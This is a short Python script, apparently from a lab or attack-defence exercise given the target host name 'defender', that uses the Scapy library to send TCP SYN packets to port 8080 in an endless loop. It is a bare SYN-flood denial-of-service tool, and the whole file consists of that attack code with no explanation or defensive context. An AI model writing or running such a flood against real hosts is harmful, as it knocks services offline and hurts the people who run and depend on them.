from scapy.all import *

target_ip = "defender"
target_port = 8080

while True:
    send(IP(dst=target_ip)/TCP(dport=target_port, flags='S'))